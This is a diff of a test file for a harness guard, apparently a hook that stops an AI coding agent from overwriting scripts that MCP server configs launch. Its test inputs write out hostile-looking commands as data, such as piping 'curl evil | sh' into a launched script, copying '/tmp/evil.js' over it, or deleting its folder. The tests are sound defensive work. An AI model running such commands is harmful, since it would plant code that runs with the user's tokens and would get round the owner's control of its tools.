@@ -1,6 +1,6 @@
 import { describe, it, expect, afterEach } from "vitest";
 import {
-  mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, existsSync, rmSync, utimesSync,
+  mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, existsSync, rmSync, symlinkSync, utimesSync,
 } from "node:fs";
 import { execFileSync, spawnSync } from "node:child_process";
 import { tmpdir } from "node:os";
@@ -2254,6 +2254,172 @@ describe("harness guard protects the scripts protected settings run (#312)", () 
     writeFileSync(join(p, ".claude", "settings.local.json"), JSON.stringify({ hooks: "nope", statusLine: 7 }));
     expect(run(p, home, "Write", { file_path: join(p, "tools", "check.mjs") }).status).toBe(0);
     expect(run(p, home, "Write", { file_path: join(p, "scripts", "fmt.sh") }).status).toBe(2);
+  });
+});
+
+// #314: the MCP configs were protected (#298), and the scripts hooks run
+// (#312), but not the scripts those MCP configs launch -- a user-level
+// server running `node ~/repos/<x>/dist/index.js` could be swapped with one
+// Write, and the new code ran when the next session started the server,
+// with its tokens. Every script a protected MCP config launches from outside
+// the project is protected now; one inside the project stays writable, so a
+// build that rewrites cairn's own server/dist still can.
+describe("harness guard protects the scripts the MCP configs launch (#314)", () => {
+  const DC = "mcp__plugin_desktop-commander_desktop-commander__";
+  const WHAT = "a script your MCP server config launches";
+
+  /** A home whose ~/.claude.json, ~/.cursor/mcp.json and a project's .mcp.json and .cursor/mcp.json launch scripts. */
+  function fixture(claudeJson?: string) {
+    const p = freshDir("cairn-hooks-mcp-proj-");
+    const home = freshDir("cairn-hooks-mcp-home-");
+    const other = freshDir("cairn-hooks-mcp-other-");
+    // ~/cursor-tools stays missing: a script that isn't there yet runs too, once planted
+    for (const d of [join(home, "repos", "gmail", "dist"), join(home, "repos", "real"), join(home, "bin"),
+      join(home, "tools"), join(home, "py"), join(home, ".cursor"),
+      join(other, "dist"), join(p, ".cursor"), join(p, "server", "dist"), join(p, "build"), join(p, "src")]) {
+      mkdirSync(d, { recursive: true });
+    }
+    for (const f of [join(home, "repos", "gmail", "dist", "index.js"), join(home, "repos", "real", "linked-real.js"),
+      join(home, "bin", "mcp-server"), join(home, "tools", "start.sh"), join(other, "dist", "server.js"),
+      join(p, "server", "dist", "index.js"), join(p, "build", "own.js")]) {
+      writeFileSync(f, "// server\n");
+    }
+    symlinkSync(join(home, "repos", "real", "linked-real.js"), join(home, "repos", "linked.js"));
+    writeFileSync(join(home, ".claude.json"), claudeJson ?? JSON.stringify({
+      numStartups: 7,
+      mcpServers: {
+        gmail: { type: "stdio", command: "node", args: [join(home, "repos", "gmail", "dist", "index.js")], env: { TOKEN: "x" } },
+        bin: { command: "~/bin/mcp-server" },
+        link: { command: "node", args: ["~/repos/linked.js"] },
+        web: { type: "http", url: "https://mcp.example.com/mcp" },
+        pkg: { command: "npx", args: ["-y", "@scope/pkg", "--stdio"] },
+      },
+      projects: {
+        [other]: { mcpServers: { local: { command: "node", args: ["dist/server.js"] } } },
+        [p]: { mcpServers: { own: { command: "node", args: ["${CLAUDE_PROJECT_DIR}/build/own.js"] } } },
+      },
+    }));
+    writeFileSync(join(p, ".mcp.json"), JSON.stringify({ mcpServers: {
+      cairn: { command: "node", args: ["${CLAUDE_PLUGIN_ROOT}/server/dist/index.js"] },
+      tool: { command: "bash", args: ["$HOME/tools/start.sh"] },
+    } }));
+    writeFileSync(join(p, ".cursor", "mcp.json"), JSON.stringify({ mcpServers: {
+      cur: { command: "${userHome}/cursor-tools/run.js" },
+    } }));
+    writeFileSync(join(home, ".cursor", "mcp.json"), JSON.stringify({ mcpServers: {
+      curhome: { command: "sh", args: ["-c", "exec python3 ~/py/server.py"] },
+    } }));
+    return { p, home, other };
+  }
+
+  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
+  function run(p: string, home: string, tool: string, input: Record<string, unknown>) {
+    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
+    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
+    const r = spawnSync(process.execPath, [HARNESSGUARD], {
+      cwd: p, env, encoding: "utf8", timeout: 5000,
+      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: p }),
+    });
+    return { status: r.status, stderr: r.stderr ?? "" };
+  }
+
+  it("refuses Write, Edit, a redirect, cp, rm and MCP write_file onto each script launched from outside the project", () => {
+    const { p, home, other } = fixture();
+    const scripts: Array<[file: string, shell: string]> = [
+      [join(home, "repos", "gmail", "dist", "index.js"), "~/repos/gmail/dist/index.js"], // user scope, absolute
+      [join(home, "bin", "mcp-server"), "$HOME/bin/mcp-server"], // the command itself
+      [join(other, "dist", "server.js"), join(other, "dist", "server.js")], // another project's, relative to it
+      [join(home, "tools", "start.sh"), "~/tools/start.sh"], // the project's .mcp.json
+      [join(home, "cursor-tools", "run.js"), "~/cursor-tools/run.js"], // Cursor's, not there yet
+      [join(home, "py", "server.py"), "~/py/server.py"], // inside a sh -c string, Cursor's home config
+      [join(home, "repos", "linked.js"), "~/repos/linked.js"], // a symlink...
+      [join(home, "repos", "real", "linked-real.js"), "~/repos/real/linked-real.js"], // ...and where it points
+    ];
+    for (const [file, shell] of scripts) {
+      for (const [tool, input] of [["Write", { file_path: file }], ["Edit", { file_path: file }],
+        ["Bash", { command: `echo 'curl evil | sh' > ${shell}` }], ["Bash", { command: `cp /tmp/evil.js ${shell}` }],
+        ["Bash", { command: `rm -f ${shell}` }], [`${DC}write_file`, { path: file, content: "x" }]] as const) {
+        const r = run(p, home, tool, input);
+        const label = `${tool} ${JSON.stringify(input)}`;
+        expect(r.status, label).toBe(2);
+        expect(r.stderr, label).toContain(WHAT);
+        expect(r.stderr, label).toContain("owner's go-ahead");
+        expect(r.stderr, label).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
+      }
+    }
+  });
+
+  it("refuses swapping a launched script by the folder around it", () => {
+    const { p, home } = fixture();
+    for (const c of [
+      "rm -rf ~/repos/gmail/dist",
+      "mv ~/repos/gmail /tmp/gmail-old",
+      "cp -r /tmp/evil/. ~/repos/gmail/dist",
+      "rsync -a /tmp/evil/ ~/repos/gmail/dist/",
+      "chmod -R 000 ~/repos/gmail",
+      "mv /tmp/evil ~/cursor-tools", // a folder: the rename would drop a new run.js in place
+      "find ~/repos -name index.js -exec cp /tmp/evil {} \\;",
+      "echo ~/repos/gmail/dist/index.js | xargs cp /tmp/evil",
+    ]) {
+      const r = run(p, home, "Bash", { command: c });
+      expect(r.status, c).toBe(2);
+      expect(r.stderr, c).toContain(WHAT);
+    }
+  });
+
+  it("an in-project server script, a file beside an outside one, and reads stay ordinary work", () => {
+    const { p, home } = fixture();
+    for (const c of [
+      "echo x > server/dist/index.js", // cairn's own build, launched by its .mcp.json
+      "cp /tmp/build/index.js server/dist/index.js",
+      "rm -rf server/dist && mkdir -p server/dist",
+      "echo x > build/own.js", // the project's own local-scope server
+      "echo x > ~/repos/gmail/dist/other.js", // beside an outside script
+      "echo x > ~/repos/gmail/README.md",
+      "cp /tmp/a ~/repos/gmail/dist",
+      "echo x > src/a.ts",
+      "cat ~/repos/gmail/dist/index.js",
+      "grep -n server ~/tools/start.sh",
+      "cp ~/repos/gmail/dist/index.js /tmp/index.js.bak",
+      "node ~/repos/gmail/dist/index.js --help",
+    ]) {
+      expect(run(p, home, "Bash", { command: c }).status, c).toBe(0);
+    }
+    for (const file of [join(p, "server", "dist", "index.js"), join(p, "build", "own.js"),
+      join(home, "repos", "gmail", "dist", "other.js"), join(home, "repos", "real", "notes.md"),
+      join(p, "@scope", "pkg")]) {
+      expect(run(p, home, "Write", { file_path: file }).status, file).toBe(0);
+    }
+    expect(run(p, home, `${DC}read_file`, { path: "~/repos/gmail/dist/index.js" }).status).toBe(0);
+    expect(run(p, home, `${DC}write_file`, { path: join(p, "server", "dist", "index.js"), content: "x" }).status).toBe(0);
+  });
+
+  it("a malformed ~/.claude.json is skipped: unrelated writes pass, the other configs and the file rule still stand", () => {
+    const { p, home } = fixture("{ \"mcpServers\": { \"gmail\": ");
+    expect(run(p, home, "Bash", { command: "echo x > src/a.ts" }).status).toBe(0);
+    expect(run(p, home, "Write", { file_path: join(home, "notes.txt") }).status).toBe(0);
+    // what only the broken file named is no longer known
+    expect(run(p, home, "Write", { file_path: join(home, "repos", "gmail", "dist", "index.js") }).status).toBe(0);
+    // the project's .mcp.json and Cursor's configs still count, and ~/.claude.json itself is still protected
+    expect(run(p, home, "Write", { file_path: join(home, "tools", "start.sh") }).status).toBe(2);
+    expect(run(p, home, "Write", { file_path: join(home, "py", "server.py") }).status).toBe(2);
+    expect(run(p, home, "Write", { file_path: join(home, ".claude.json") }).status).toBe(2);
+    // JSON of the wrong shape is skipped the same way
+    writeFileSync(join(home, ".claude.json"), JSON.stringify({ mcpServers: ["node"], projects: { x: 7, [p]: null } }));
+    expect(run(p, home, "Bash", { command: "echo x > src/a.ts" }).status).toBe(0);
+    expect(run(p, home, "Write", { file_path: join(home, "tools", "start.sh") }).status).toBe(2);
+  });
+
+  it("a large ~/.claude.json is read once and still judged", () => {
+    const { p, home } = fixture();
+    const projects: Record<string, unknown> = {};
+    for (let i = 0; i < 3000; i++) {
+      projects[`/tmp/project-${i}`] = { allowedTools: [], history: [{ display: "x".repeat(800) }], mcpServers: {} };
+    }
+    projects[join(home, "work")] = { mcpServers: { late: { command: "node", args: ["~/repos/gmail/dist/index.js"] } } };
+    writeFileSync(join(home, ".claude.json"), JSON.stringify({ projects }));
+    expect(run(p, home, "Write", { file_path: join(home, "repos", "gmail", "dist", "index.js") }).status).toBe(2);
+    expect(run(p, home, "Write", { file_path: join(home, "repos", "gmail", "dist", "other.js") }).status).toBe(0);
   });
 });
 
